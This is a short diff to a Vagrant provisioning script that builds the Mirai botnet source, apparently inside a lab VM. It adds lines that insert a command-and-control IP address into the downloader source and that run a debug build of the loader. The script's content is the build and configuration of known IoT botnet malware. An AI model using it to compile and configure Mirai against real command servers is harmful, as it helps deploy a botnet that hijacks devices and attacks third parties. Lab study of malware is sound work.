@@ -100,6 +100,11 @@ sed -i "s|{DNS}|$DNS|g;" /vagrant/mirai/bot/util.c
 cp /vagrant/mirai/bot/const.hpp /vagrant/mirai/bot/const.h
 sed -i "s|{NI}|$ni|g;" /vagrant/mirai/bot/const.h
 
+# process {CNC}
+cp /vagrant/mirai/dlr/main.cpp /vagrant/mirai/dlr/main.c
+CNC=$(echo "$cnc_ip" | sed -r 's/[.]/,/g')
+sed -i "s|{CNC}|$CNC|g;" /vagrant/mirai/dlr/main.c
+
 # build debug
 cd /vagrant/mirai/
 ./build.sh debug telnet
@@ -120,6 +125,7 @@ cp /vagrant/mirai/dlr/release/* /vagrant/mirai/loader/bins/
 echo ">>> Building loader..."
 cd /vagrant/mirai/loader
 ./build.sh
+./build.debug.sh
 /vagrant/mirai/reports/build.sh 
 
 echo ">>> Done"
